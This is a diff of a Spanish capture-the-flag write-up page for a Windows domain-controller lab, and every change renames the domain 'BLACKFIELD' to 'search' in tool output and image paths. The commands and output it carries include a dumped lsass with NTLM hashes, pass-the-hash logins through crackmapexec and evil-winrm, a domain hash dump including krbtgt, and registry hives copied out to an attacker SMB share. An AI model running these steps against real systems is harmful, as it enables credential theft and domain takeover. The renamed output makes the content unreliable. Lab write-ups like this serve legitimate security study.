 <p class="plain-text">Al dumpear los <code class="language-plaintext highlighter-rouge">logons</code> encontramos varias credenciales, entre ellas las de <code class="language-plaintext highlighter-rouge">svc_backup</code>, esta autenticación nos muestra su hash <code class="language-plaintext highlighter-rouge">NTLM</code> en el dominio</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
@@ -453,25 +447,25 @@ Opening : 'lsass.DMP' file for minidump...
 Authentication Id : 0 ; 406458 (00000000:000633ba)
 Session           : Interactive from 2
 User Name         : svc_backup
-Domain            : BLACKFIELD
+Domain            : search
 Logon Server      : DC01
 Logon Time        : 23/02/2020 12:00:03 p. m.
 SID               : S-1-5-21-4194615774-2175524697-3563712290-1413
         msv :
          [00000003] Primary
          * Username : svc_backup
-         * Domain   : BLACKFIELD
+         * Domain   : search
          * NTLM     : 9658d1d1dcd9250115e2205d9f48400d
          * SHA1     : 463c13a9a31fc3252c68ba0a44f0221626a33e5c
          * DPAPI    : a03cd8e9d30171f3cfe8caad92fef621
         tspkg :
         wdigest :
          * Username : svc_backup
-         * Domain   : BLACKFIELD
+         * Domain   : search
          * Password : (null)
         kerberos :
          * Username : svc_backup
-         * Domain   : BLACKFIELD.LOCAL
+         * Domain   : search.LOCAL
          * Password : (null)
         ssp :
         credman :
@@ -489,29 +483,29 @@ FILE: ======== lsass.DMP =======
 authentication_id 406458 (633ba)
 session_id 2
 username svc_backup
-domainname BLACKFIELD
+domainname search
 logon_server DC01
 logon_time 2020-02-23T18:00:03.423728+00:00
 sid S-1-5-21-4194615774-2175524697-3563712290-1413
 luid 406458
 	== MSV ==
 		Username: svc_backup
-		Domain: BLACKFIELD
+		Domain: search
 		LM: NA
 		NT: 9658d1d1dcd9250115e2205d9f48400d
 		SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
 		DPAPI: a03cd8e9d30171f3cfe8caad92fef621
 	== WDIGEST [633ba]==
 		username svc_backup
-		domainname BLACKFIELD
+		domainname search
 		password None
 		password (hex)
 	== Kerberos ==
 		Username: svc_backup
-		Domain: BLACKFIELD.LOCAL
+		Domain: search.LOCAL
 	== WDIGEST [633ba]==
 		username svc_backup
-		domainname BLACKFIELD
+		domainname search
 		password None
 		password (hex)
 
@@ -522,21 +516,21 @@ authentication_id 365835 (5950b)
 
 <p class="plain-text">Comprobando el hash <code class="language-plaintext highlighter-rouge">NT</code> del usuario <code class="language-plaintext highlighter-rouge">svc_backup</code> con <code class="language-plaintext highlighter-rouge">crackmapexec</code> podemos ver que es valido a nivel de dominio tanto en el protocolo <code class="language-plaintext highlighter-rouge">SMB</code> como en <code class="language-plaintext highlighter-rouge">winrm</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ crackmapexec </span><span class="p">smb blackfield.local -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)  
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="ve">[+] </span><span class="p">BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb search.local -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC01) (domain:search.local) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="ve">[+] </span><span class="p">search.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d
 
-</span><span class="ve">❯ crackmapexec </span><span class="p">winrm blackfield.local -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
-</span><span class="az">SMB         </span><span class="p">blackfield.local 5985   DC01             </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
-</span><span class="az">HTTP        </span><span class="p">blackfield.local 5985   DC01             </span><span class="az">[*] </span><span class="p">http://blackfield.local:5985/wsman
-</span><span class="az">WINRM       </span><span class="p">blackfield.local 5985   DC01             </span><span class="ve">[+] </span><span class="p">BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d </span><span class="am">(Pwn3d!)</span>
+</span><span class="ve">❯ crackmapexec </span><span class="p">winrm search.local -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
+</span><span class="az">SMB         </span><span class="p">search.local 5985   DC01             </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 (name:DC01) (domain:search.local)
+</span><span class="az">HTTP        </span><span class="p">search.local 5985   DC01             </span><span class="az">[*] </span><span class="p">http://search.local:5985/wsman
+</span><span class="az">WINRM       </span><span class="p">search.local 5985   DC01             </span><span class="ve">[+] </span><span class="p">search.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d </span><span class="am">(Pwn3d!)</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Al ser valido para <code class="language-plaintext highlighter-rouge">winrm</code> podemos conectarnos haciendo uso de <code class="language-plaintext highlighter-rouge">evil-winrm</code> con un passthehash, obtenemos una shell como <code class="language-plaintext highlighter-rouge">svc_backup</code> y podemos ver la <code class="language-plaintext highlighter-rouge">flag</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ evil-winrm</span><span class="p"> -i blackfield.local -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d  
+<code><span class="ve">❯ evil-winrm</span><span class="p"> -i search.local -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d  
 PS C:\Users\svc_backup\Documents> </span><span class="am">whoami</span><span class="p">
-blackfield\svc_backup
+search\svc_backup
 PS C:\Users\svc_backup\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\user.txt
 392**************************543
 PS C:\Users\svc_backup\Documents></span>
@@ -611,8 +605,8 @@ Querying all shadow copies with the shadow copy set ID {4180af0d-16d3-408f-9ae5-
 		- Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
 		- Creation time: 6/25/2023 10:38:15 PM
 		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
-		- Originating machine: DC01.BLACKFIELD.local
-		- Service machine: DC01.BLACKFIELD.local
+		- Originating machine: DC01.search.local
+		- Service machine: DC01.search.local
 		- Not exposed
 		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
 		- Attributes:  No_Auto_Release Persistent No_Writers Differential
@@ -657,7 +651,7 @@ PS C:\ProgramData></span>
 
 <p class="plain-text">Podemos conectarnos con <code class="language-plaintext highlighter-rouge">smbclient</code> de <code class="language-plaintext highlighter-rouge">impacket</code> y usando el recurso <code class="language-plaintext highlighter-rouge">C$</code>, entrar a la carpeta <code class="language-plaintext highlighter-rouge">ProgramData</code> donde tenemos nuestros archivos y descargarlos con <code class="language-plaintext highlighter-rouge">get</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ impacket-smbclient </span><span class="p">blackfield.local/svc_backup@dc01.blackfield.local -hashes :9658d1d1dcd9250115e2205d9f48400d  
+<code><span class="ve">❯ impacket-smbclient </span><span class="p">search.local/svc_backup@dc01.search.local -hashes :9658d1d1dcd9250115e2205d9f48400d  
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 Type help for list of commands
@@ -684,25 +678,25 @@ DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
 audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
 support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
-BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
-BLACKFIELD.local\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
-BLACKFIELD.local\BLACKFIELD189208:1107:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
-BLACKFIELD.local\BLACKFIELD404458:1108:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
+search.local\search764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
+search.local\search538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
+search.local\search189208:1107:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
+search.local\search404458:1108:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
 ...........................................................................................................  </span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Al comprobar el hash NT de <code class="language-plaintext highlighter-rouge">Administrator</code> con crackmapexec devuelve <code class="language-plaintext highlighter-rouge">Pwn3d!</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ crackmapexec </span><span class="p">smb blackfield.local -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)  
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="ve">[+] </span><span class="p">BLACKFIELD.local\Administrator:184fb5e5178480be64824d4cd53b99ee </span><span class="am">(Pwn3d!)</span>
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb search.local -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC01) (domain:search.local) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="ve">[+] </span><span class="p">search.local\Administrator:184fb5e5178480be64824d4cd53b99ee </span><span class="am">(Pwn3d!)</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Ya que es valido nos podemos simplemente conectar con el hash <code class="language-plaintext highlighter-rouge">NT</code> haciendo uso de <code class="language-plaintext highlighter-rouge">evil-winrm</code> para obtener una shell como <code class="language-plaintext highlighter-rouge">Administrator</code> y poder leer la <code class="language-plaintext highlighter-rouge">flag</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ evil-winrm</span><span class="p"> -i blackfield.local -u Administrator -H 184fb5e5178480be64824d4cd53b99ee  
+<code><span class="ve">❯ evil-winrm</span><span class="p"> -i search.local -u Administrator -H 184fb5e5178480be64824d4cd53b99ee  
 PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
-blackfield\administrator
+search\administrator
 PS C:\Users\Administrator\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\root.txt
 437**************************5cb
 PS C:\Users\Administrator\Documents></span>
@@ -714,7 +708,7 @@ PS C:\Users\Administrator\Documents></span>
 <br><h3 class="post-title">Alternativa - Administrator</h3><br>
 
 <p class="plain-text">Si miramos en <code class="language-plaintext highlighter-rouge">bloodhound</code> los grupos a los que pertenece <code class="language-plaintext highlighter-rouge">svc_backup</code> lo mas interesante que encontramos es el grupo a nivel de dominio <code class="language-plaintext highlighter-rouge">Backup Operators</code></p>
-<a href="/htb/blackfield/2.png" target="_blank"><div><p><img src="/htb/blackfield/2.png"></p></div></a>
+<a href="/htb/search/2.png" target="_blank"><div><p><img src="/htb/search/2.png"></p></div></a>
 
 <p class="plain-text">Hay diferentes formas de explotarlo, iniciaremos subiendo el tipico <code class="language-plaintext highlighter-rouge">netcat.exe</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
@@ -890,7 +884,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 <p class="plain-text">Haciendo uso de <code class="language-plaintext highlighter-rouge">reg</code> podemos hacer un <code class="language-plaintext highlighter-rouge">backup</code> y guardarlo en nuestro recurso smb, esto nos crea una copia de la <code class="language-plaintext highlighter-rouge">SAM</code>, el <code class="language-plaintext highlighter-rouge">SYSTEM</code> y el <code class="language-plaintext highlighter-rouge">SECURITY</code> como <code class="language-plaintext highlighter-rouge">.save</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ impacket-reg </span><span class="p">blackfield.local/svc_backup@dc01.blackfield.local -hashes :9658d1d1dcd9250115e2205d9f48400d backup -o </span><span class="am">'\\10.10.14.10\kali'</span><span class="p">  
+<code><span class="ve">❯ impacket-reg </span><span class="p">search.local/svc_backup@dc01.search.local -hashes :9658d1d1dcd9250115e2205d9f48400d backup -o </span><span class="am">'\\10.10.14.10\kali'</span><span class="p">  
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
 [!] Cannot check RemoteRegistry status. Hoping it is started...
@@ -931,16 +925,16 @@ NL$KM:8801b205db707a0fef52df0696764ca4bd6e62d106631a7e312fa26df86c4250fc8d5ca4fc
 
 <p class="plain-text">Esta contraseña en texto claro pertenece al usuario <code class="language-plaintext highlighter-rouge">Administrator</code>, al comprobarla usando <code class="language-plaintext highlighter-rouge">crackmapexec</code> a nivel de dominio este nos devuelve un <code class="language-plaintext highlighter-rouge">Pwn3d!</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ crackmapexec </span><span class="p">smb blackfield.local -u Administrator -p ###_ADM1N_3920_###
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)  
-</span><span class="az">SMB         </span><span class="p">blackfield.local 445    DC01             </span><span class="ve">[+] </span><span class="p">BLACKFIELD.local\Administrator:###_ADM1N_3920_### </span><span class="am">(Pwn3d!)</span>
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb search.local -u Administrator -p ###_ADM1N_3920_###
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="az">[*] </span><span class="p">Windows 10.0 Build 17763 x64 (name:DC01) (domain:search.local) (signing:True) (SMBv1:False)  
+</span><span class="az">SMB         </span><span class="p">search.local 445    DC01             </span><span class="ve">[+] </span><span class="p">search.local\Administrator:###_ADM1N_3920_### </span><span class="am">(Pwn3d!)</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Podemos simplemente conectarnos con <code class="language-plaintext highlighter-rouge">evil-winrm</code> como Administrator y ver la flag</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ evil-winrm </span><span class="p">-i blackfield.local -u Administrator -p ###_ADM1N_3920_###  
+<code><span class="ve">❯ evil-winrm </span><span class="p">-i search.local -u Administrator -p ###_ADM1N_3920_###  
 PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
-blackfield\administrator
+search\administrator
 PS C:\Users\Administrator\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\root.txt
 437**************************5cb
 PS C:\Users\Administrator\Documents></span>
